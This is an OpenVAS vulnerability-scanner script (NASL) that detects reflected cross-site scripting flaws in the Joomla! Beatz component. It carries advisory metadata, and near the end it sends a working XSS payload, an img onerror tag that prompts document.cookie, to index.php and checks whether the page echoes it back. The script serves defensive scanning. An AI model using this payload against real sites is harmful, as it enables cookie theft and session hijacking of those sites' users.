##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_joomla_beatz_com_mult_xss_vuln.nasl 9352 2018-04-06 07:13:02Z cfischer $
#
# Joomla! 'Beatz' Component Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow remote attackers to insert
arbitrary HTML and script code, which will be executed in a user's browser
session in the context of an affected site.

Impact Level: Application";

tag_affected = "Joomla! Beatz Component";

tag_insight = "The flaws are due to improper validation of user-supplied inputs
passed via the 'do', 'keyword', and 'video_keyword' parameters to the
'index.php', which allows attackers to execute arbitrary HTML and script
code in the context of an affected application or site.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running Joomla Beatz component and is prone to
multiple cross site scripting vulnerabilities.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902671");
  script_version("$Revision: 9352 $");
  script_bugtraq_id(53030);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:13:02 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2012-04-25 17:38:13 +0530 (Wed, 25 Apr 2012)");
  script_name("Joomla! 'Beatz' Component Multiple Cross Site Scripting Vulnerabilities");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/53030");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/74912");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/522361");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/111896/joomlabeatz-xss.txt");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("joomla/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Variable Initialization
joomlaPort = 0;
joomlaDir = "";
url = "";

## Get HTTP Port
joomlaPort = get_http_port(default:80);
if(!joomlaPort){
  exit(0);
}

## Get the application directory
if(!joomlaDir = get_dir_from_kb(port:joomlaPort, app:"joomla")){
  exit(0);
}

## Construct attack request
url = '/beatz/index.php?do=listAll&keyword=++Search"><img+src=' +
      '0+onerror=prompt(document.cookie)>&option=com_find';

## Check the response to confirm vulnerability
if(http_vuln_check(port:joomlaPort, url:url, check_header:TRUE,
   pattern:"onerror=prompt\(document.cookie\)>", extra_check:"BeatzHeader")){
  security_message(joomlaPort);
}
